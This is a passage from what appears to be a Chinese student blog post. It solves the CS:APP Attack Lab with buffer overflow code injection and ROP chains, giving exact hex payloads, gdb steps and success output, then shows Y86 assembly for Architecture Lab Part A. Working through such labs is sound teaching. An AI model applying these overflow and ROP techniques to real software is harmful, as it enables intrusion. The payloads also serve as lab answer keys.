<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── cookie.txt</span><br><span class="line">├── ctarget</span><br><span class="line">├── farm.c</span><br><span class="line">├── hex2raw</span><br><span class="line">├── README.txt</span><br><span class="line">└── rtarget</span><br></pre></td></tr></table></figure>



<h2 id="Phase-1-1"><a href="#Phase-1-1" class="headerlink" title="Phase-1"></a>Phase-1</h2><p><code>phase-1</code>要求构造输入，改变<code>getbuf</code>函数的返回地址，执行<code>touch1</code>函数的代码，根据反汇编代码:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">00000000004017a8 &lt;getbuf&gt;:</span><br><span class="line">  4017a8:       48 83 ec 28             sub    $0x28,%rsp</span><br><span class="line">  4017ac:       48 89 e7                mov    %rsp,%rdi</span><br><span class="line">  4017af:       e8 8c 02 00 00          call   401a40 &lt;Gets&gt;</span><br><span class="line">  4017b4:       b8 01 00 00 00          mov    $0x1,%eax</span><br><span class="line">  4017b9:       48 83 c4 28             add    $0x28,%rsp</span><br><span class="line">  4017bd:       c3                      ret    </span><br><span class="line">  4017be:       90                      nop    </span><br><span class="line">  4017bf:       90                      nop</span><br><span class="line">  </span><br><span class="line">00000000004017c0 &lt;touch1&gt;:              </span><br><span class="line">  4017c0:       48 83 ec 08             sub    $0x8,%rsp</span><br><span class="line">  4017c4:       c7 05 0e 2d 20 00 01    movl   $0x1,0x202d0e(%rip)        # 6044dc &lt;vlevel&gt;</span><br><span class="line">  ......</span><br></pre></td></tr></table></figure>

<p><code>getbuf</code>函数并没有在一开始<code>push %rdp</code>，因此栈结构为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">返回地址</span><br><span class="line">------</span><br><span class="line">0x28字节</span><br><span class="line">------ &lt;- rsp</span><br></pre></td></tr></table></figure>

<p>因此只需要构造40+8个字节的字符串，就可以通过缓冲区溢出修改函数<code>getbuf</code>的返回地址，返回地址为: <code>0x00000000004017c0</code></p>
<h3 id="Answer-6"><a href="#Answer-6" class="headerlink" title="Answer"></a>Answer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 45 14 11 c0 17 40 00 00 00 00</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./hex2raw -i phase1.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br></pre></td></tr></table></figure>



<h2 id="Phase-2-1"><a href="#Phase-2-1" class="headerlink" title="Phase-2"></a>Phase-2</h2><p><code>phase-2</code>需要带参数<code>val(cookie的16进制值)</code>调用函数<code>touch2</code>，因此需要自行构造汇编代码注入:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat tmp.s</span><br><span class="line">push $0x004017ec</span><br><span class="line">movq $0x59b997fa, %rdi</span><br><span class="line">ret</span><br><span class="line">myarch% gcc -c tmp.s &amp;&amp; objdump -dS tmp.o</span><br><span class="line"></span><br><span class="line">tmp.o:     file format elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">0000000000000000 &lt;.text&gt;:</span><br><span class="line">   0:   68 ec 17 40 00          push   $0x4017ec</span><br><span class="line">   5:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi</span><br><span class="line">   c:   c3                      ret</span><br></pre></td></tr></table></figure>

<p>再利用gdb查看进入<code>getbuf</code>函数后栈指针的位置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">(gdb) set args -q</span><br><span class="line">(gdb) disassemble getbuf</span><br><span class="line">Dump of assembler code for function getbuf:</span><br><span class="line">   0x00000000004017a8 &lt;+0&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x00000000004017ac &lt;+4&gt;:     mov    %rsp,%rdi</span><br><span class="line">   0x00000000004017af &lt;+7&gt;:     call   0x401a40 &lt;Gets&gt;</span><br><span class="line">   0x00000000004017b4 &lt;+12&gt;:    mov    $0x1,%eax</span><br><span class="line">   0x00000000004017b9 &lt;+17&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x00000000004017bd &lt;+21&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) b *getbuf+4</span><br><span class="line">Breakpoint 1 at 0x4017ac: file buf.c, line 14.</span><br><span class="line">(gdb) r</span><br><span class="line">...</span><br><span class="line">(gdb) p $rsp</span><br><span class="line">$1 = (void *) 0x5561dc78</span><br></pre></td></tr></table></figure>

<p>栈顶地址为<code>0x5561dc78</code>，即注入的汇编代码起始地址为<code>0x5561dc78</code>，因此同时将<code>getbuf</code>的返回地址改为该值</p>
<h3 id="Answer-7"><a href="#Answer-7" class="headerlink" title="Answer"></a>Answer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat phase2.txt </span><br><span class="line">68 ec 17 40 00</span><br><span class="line">48 c7 c7 fa 97 b9 59</span><br><span class="line">c3</span><br><span class="line">00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">myarch% ./hex2raw -i phase2.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br></pre></td></tr></table></figure>



<h2 id="Phase-3-1"><a href="#Phase-3-1" class="headerlink" title="Phase-3"></a>Phase-3</h2><p><code>phase-3</code>需要传入cookie字符串的指针，因此得在栈上存放cookie字符串，先将cookie<code>59b997fa</code>转化为十六进制ascii码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00(&#x27;\0&#x27;)</span><br></pre></td></tr></table></figure>

<p>因为<code>getbuf</code>函数ret后返回地址会被注入为<code>touch3</code>，因此得将该字符串放到上一个函数栈帧，即<code>test</code>函数的栈帧内，用gdb查看rsp值为:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rsp</span><br><span class="line">rsp            0x5561dca0          0x5561dca0</span><br></pre></td></tr></table></figure>

<p>有八字节需要存储返回地址，因此cooike字符串指针地址为<code>0x5561dca8</code>，结合<code>phase-2</code>的方法，成功注入</p>
<h3 id="Answer-8"><a href="#Answer-8" class="headerlink" title="Answer"></a>Answer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat phase3.txt </span><br><span class="line">68 fa 18 40 00</span><br><span class="line">48 c7 c7 a8 dc 61 55</span><br><span class="line">c3</span><br><span class="line">00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">00 00 00 00 00</span><br><span class="line">78 dc 61 55 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br><span class="line">myarch% ./hex2raw -i phase3.txt | ./ctarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br></pre></td></tr></table></figure>



<h2 id="Phase-4-1"><a href="#Phase-4-1" class="headerlink" title="Phase-4"></a>Phase-4</h2><p>Level 2中有栈随机化处理，并且禁止执行栈上代码，因此无法使用code injection的方法，而是利用其提供的一系列gadget中的指令字节来实现攻击，要求和<code>phase-2</code>一样</p>
<p>可以找到这两条指令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	ret</span><br><span class="line"></span><br><span class="line">00000000004019c3 &lt;setval_426&gt;:</span><br><span class="line">  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)</span><br><span class="line">  4019c9:	c3                   	ret</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4019ab: 58						popq %rax</span><br><span class="line">4019ac: 90						nop</span><br><span class="line">4019ad: c3						ret</span><br><span class="line"></span><br><span class="line">4019c5: 48 89 c7					movq %rax %rdi</span><br><span class="line">4019c8: 90						nop</span><br><span class="line">4019c9: c3						ret</span><br></pre></td></tr></table></figure>

<p>栈帧结构:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">*touch2				# address of touch2</span><br><span class="line">0x4019c5			# movq %rax %rdi</span><br><span class="line">0x59b997fa			# cookie</span><br><span class="line">0x4019ab			# popq %rax</span><br><span class="line">...					# 0x28字节		&lt;-rsp</span><br></pre></td></tr></table></figure>



<h3 id="Answer-9"><a href="#Answer-9" class="headerlink" title="Answer"></a>Answer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat phase4.txt </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">c5 19 40 00 00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br><span class="line">myarch% ./hex2raw -i phase4.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch2!: You called touch2(0x59b997fa)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br></pre></td></tr></table></figure>



<h2 id="Phase-5-1"><a href="#Phase-5-1" class="headerlink" title="Phase-5"></a>Phase-5</h2><p>要求同<code>phase-3</code>，由于栈随机化，不能直接指定存储在栈上的字符指针，指针值要由栈指针得到，则构造的栈应该有以下结构</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ascii of cookie</span><br><span class="line">address of touch3</span><br><span class="line">gadget: movq %rax %rdi</span><br><span class="line">address of add_xy</span><br><span class="line">gadget: movq %rax %rdi</span><br><span class="line">gadget: movq %rsp %rax		# 注意，操作地址值时，必须用传送四字的指令，不然地址会被截断，并且在使用地址值时会符号扩展为不可访问的内存地址</span><br><span class="line">gadget: movl %ecx %esi</span><br><span class="line">gadget: movl %edx %ecx</span><br><span class="line">gadget: movl %eax %edx</span><br><span class="line">0x20</span><br><span class="line">gadget: popq %rax</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>要利用<code>add_xy</code>函数计算出<code>cookie字符串</code>的值，具体思路是:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pop %rax			# %rax &lt;- 0x20</span><br><span class="line">mov %eax %edx</span><br><span class="line">mov %edx %ecx</span><br><span class="line">mov %ecx %esi</span><br><span class="line">mov %rsp %rax</span><br><span class="line">mov %rax %rdi</span><br><span class="line">add_xy				# %rax &lt;- %rsp + 0x18(3条指令地址)</span><br></pre></td></tr></table></figure>



<h3 id="Answer-10"><a href="#Answer-10" class="headerlink" title="Answer"></a>Answer</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">myarch% cat phase5.txt </span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">20 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">34 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40 00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61 00</span><br><span class="line">myarch% ./hex2raw -i phase5.txt | ./rtarget -q</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br></pre></td></tr></table></figure>



<h1 id="4-ArchitectureLab"><a href="#4-ArchitectureLab" class="headerlink" title="4. ArchitectureLab"></a>4. ArchitectureLab</h1><h2 id="Part-A"><a href="#Part-A" class="headerlink" title="Part A"></a>Part A</h2><h3 id="Function-sum-list"><a href="#Function-sum-list" class="headerlink" title="Function sum_list"></a>Function sum_list</h3><p><strong>Code:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp</span><br><span class="line">call main</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad   0x00a</span><br><span class="line">        .quad   ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad   0x0b0</span><br><span class="line">        .quad   ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad   0xc00</span><br><span class="line">        .quad   0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq  ele1, %rdi</span><br><span class="line">        call    sum_list</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">sum_list:</span><br><span class="line">        irmovq  $0x0, %rax                # rax:  long val</span><br><span class="line">        irmovq  $0x0, %rdx                # rdx:  constant 0</span><br><span class="line">        irmovq  $0x8, %r8                 # r8:   constant 8</span><br><span class="line">        jmp     test</span><br><span class="line">loop:</span><br><span class="line">        mrmovq  (%rdi), %r9             # rp:   ls-&gt;val</span><br><span class="line">        addq    %r9, %rax               # val += ls-&gt;val;</span><br><span class="line">        addq    %r8, %rdi</span><br><span class="line">        mrmovq  (%rdi), %rdi            # ls = ls-&gt;next;</span><br><span class="line">test:</span><br><span class="line">        rrmovq  %rdi, %rcx</span><br><span class="line">        subq    %rdx, %rcx</span><br><span class="line">        jne     loop</span><br><span class="line">done:</span><br><span class="line">        ret                                             # return val</span><br><span class="line"></span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>



<p><strong>Running Result:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./yas sum.ys</span><br><span class="line">myarch% ./yis sum.yo</span><br><span class="line">Stopped in 35 steps at PC = 0x13.  Status &#x27;HLT&#x27;, CC Z=1 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000200</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000008</span><br><span class="line">%r9:    0x0000000000000000      0x0000000000000c00</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>



<h3 id="Function-rsum-list"><a href="#Function-rsum-list" class="headerlink" title="Function rsum_list"></a>Function rsum_list</h3><p><strong>Code:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp</span><br><span class="line">call main</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad   0x00a</span><br><span class="line">        .quad   ele2</span><br><span class="line">ele2:</span><br><span class="line">        .quad   0x0b0</span><br><span class="line">        .quad   ele3</span><br><span class="line">ele3:</span><br><span class="line">        .quad   0xc00</span><br><span class="line">        .quad   0</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq  ele1, %rdi</span><br><span class="line">        call    rsum_list</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">rsum_list:</span><br><span class="line">        rrmovq  %rdi, %r9</span><br><span class="line">        irmovq  $0x0, %rsi        # rsi:  constant 0</span><br><span class="line">        irmovq  $0x8, %r8         # r8:   constant 8</span><br><span class="line">        subq    %rsi, %r9</span><br><span class="line">        jne     else</span><br><span class="line">        irmovq  $0, %rax</span><br><span class="line">        ret</span><br><span class="line">else:</span><br><span class="line">        mrmovq  (%rdi), %rax    # val = ls-&gt;val</span><br><span class="line">        pushq   %rax</span><br><span class="line">        addq    %r8, %rdi</span><br><span class="line">        mrmovq  (%rdi), %rdi</span><br><span class="line">        call    rsum_list       # rest = rsum_list(ls-&gt;next);</span><br><span class="line">        popq    %rcx</span><br><span class="line">        addq    %rcx, %rax</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>



<p><strong>Running Result:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./yas rsum.ys</span><br><span class="line">myarch% ./yis rsum.yo</span><br><span class="line">Stopped in 52 steps at PC = 0x13.  Status &#x27;HLT&#x27;, CC Z=0 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rcx:   0x0000000000000000      0x000000000000000a</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000200</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000008</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01c0: 0x0000000000000000      0x00000000000000a9</span><br><span class="line">0x01c8: 0x0000000000000000      0x0000000000000c00</span><br><span class="line">0x01d0: 0x0000000000000000      0x00000000000000a9</span><br><span class="line">0x01d8: 0x0000000000000000      0x00000000000000b0</span><br><span class="line">0x01e0: 0x0000000000000000      0x00000000000000a9</span><br><span class="line">0x01e8: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x01f0: 0x0000000000000000      0x000000000000005b</span><br><span class="line">0x01f8: 0x0000000000000000      0x0000000000000013</span><br></pre></td></tr></table></figure>



<h3 id="Function-copy-block"><a href="#Function-copy-block" class="headerlink" title="Function copy_block"></a>Function copy_block</h3><p><strong>Code:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">.pos 0</span><br><span class="line">irmovq stack, %rsp</span><br><span class="line">call main</span><br><span class="line">halt</span><br><span class="line"></span><br><span class="line"># Sample linked list</span><br><span class="line">.align 8</span><br><span class="line">ele1:</span><br><span class="line">        .quad   0x00a</span><br><span class="line">ele2:</span><br><span class="line">        .quad   0x0b0</span><br><span class="line">ele3:</span><br><span class="line">        .quad   0xc00</span><br><span class="line"></span><br><span class="line">main:</span><br><span class="line">        irmovq  ele1, %rdi</span><br><span class="line">        irmovq  $0x40, %r8</span><br><span class="line">        subq    %r8, %rsp</span><br><span class="line">        irmovq  ele1, %rdi      # rdi: src</span><br><span class="line">        rrmovq  %rsp, %rsi      # rsi: dest</span><br><span class="line">        irmovq  $0x3, %rcx      # rcx: len</span><br><span class="line">        pushq   %r8</span><br><span class="line">        call    copy_block</span><br><span class="line">        popq    %r8</span><br><span class="line">        addq    %r8, %rsp</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line">copy_block:</span><br><span class="line">        irmovq  $0x0, %rax</span><br><span class="line">        irmovq  $0x8, %r8</span><br><span class="line">        irmovq  $0x0, %r9</span><br><span class="line">        irmovq  $0x1, %r10</span><br><span class="line">        jmp     test</span><br><span class="line">loop:</span><br><span class="line">        mrmovq  (%rdi), %rdx</span><br><span class="line">        rmmovq  %rdx, (%rsi)</span><br><span class="line">        xorq    %rdx, %rax</span><br><span class="line">        addq    %r8, %rdi</span><br><span class="line">        addq    %r8, %rsi</span><br><span class="line">        subq    %r10, %rcx</span><br><span class="line">test:</span><br><span class="line">        subq    %r9, %rcx</span><br><span class="line">        jne     loop</span><br><span class="line">        ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">.pos 0x200</span><br><span class="line">stack:</span><br></pre></td></tr></table></figure>



<p><strong>Running Result:</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">myarch% ./yas copy.ys</span><br><span class="line">myarch% ./yis copy.yo</span><br><span class="line">Stopped in 46 steps at PC = 0x13.  Status &#x27;HLT&#x27;, CC Z=0 S=0 O=0</span><br><span class="line">Changes to registers:</span><br><span class="line">%rax:   0x0000000000000000      0x0000000000000cba</span><br><span class="line">%rdx:   0x0000000000000000      0x0000000000000c00</span><br><span class="line">%rsp:   0x0000000000000000      0x0000000000000200</span><br><span class="line">%rsi:   0x0000000000000000      0x00000000000001d0</span><br><span class="line">%rdi:   0x0000000000000000      0x0000000000000030</span><br><span class="line">%r8:    0x0000000000000000      0x0000000000000040</span><br><span class="line">%r10:   0x0000000000000000      0x0000000000000001</span><br><span class="line"></span><br><span class="line">Changes to memory:</span><br><span class="line">0x01a8: 0x0000000000000000      0x0000000000000067</span><br><span class="line">0x01b0: 